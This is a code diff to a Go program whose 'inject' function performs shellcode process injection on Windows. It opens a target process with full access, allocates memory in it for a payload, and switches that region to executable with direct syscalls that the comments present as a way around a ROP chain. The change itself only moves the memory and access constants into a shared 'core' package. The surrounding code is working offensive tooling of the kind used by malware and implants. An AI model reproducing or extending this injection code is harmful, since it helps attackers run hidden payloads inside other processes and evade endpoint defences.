@@ -154,15 +154,6 @@ import (
 	"time"
 )
 
-const (
-    PROCESS_ALL_ACCESS = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xFFF
-    MEM_COMMIT         = 0x1000
-    MEM_RESERVE        = 0x2000
-    MEM_COMMIT_RESERVE = MEM_COMMIT | MEM_RESERVE
-    PAGE_READWRITE     = 0x04
-    PAGE_EXECUTE_READ  = 0x20
-    PAGE_EXECUTE_READWRITE = 0x40
-)
 
 func inject(pid C.DWORD, processName string, payload []byte) bool {
 	if pid == 0 {
@@ -171,7 +162,7 @@ func inject(pid C.DWORD, processName string, payload []byte) bool {
 	}
 	fmt.Printf("[+] Found target process '%s' with PID: %d\n", processName, pid)
 
-	hProcess, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(pid))
+	hProcess, err := syscall.OpenProcess(core.PROCESS_ALL_ACCESS, false, uint32(pid))
 	if err != nil {
 		fmt.Fprintf(os.Stderr, "[-] Failed to open process %s (%d): %v\n", processName, pid, err)
 		return false
@@ -205,8 +196,8 @@ func inject(pid C.DWORD, processName string, payload []byte) bool {
 		uintptr(hProcess),
 		0,
 		uintptr(len(payload)),
-		MEM_COMMIT|MEM_RESERVE,
-		PAGE_READWRITE,
+		core.MEM_COMMIT_RESERVE,
+		core.PAGE_READWRITE,
 		0,
 	)
 	if shellcodeAddr == 0 {
@@ -235,7 +226,7 @@ func inject(pid C.DWORD, processName string, payload []byte) bool {
 	// Change memory protection to RX (Read-Execute) using direct syscalls instead of ROP chain
 	oldProtect := uint32(0)
 	regionSize := uintptr(len(payload))
-	err = core.NtProtectVirtualMemory(windows.Handle(hProcess), &shellcodeAddr, &regionSize, PAGE_EXECUTE_READ, &oldProtect)
+	err = core.NtProtectVirtualMemory(windows.Handle(hProcess), &shellcodeAddr, &regionSize, core.PAGE_EXECUTE_READ, &oldProtect)
 	if err != nil {
 		fmt.Fprintf(os.Stderr, "[-] Failed to change memory protection in %s (%d): %v\n", processName, pid, err)
 		return false
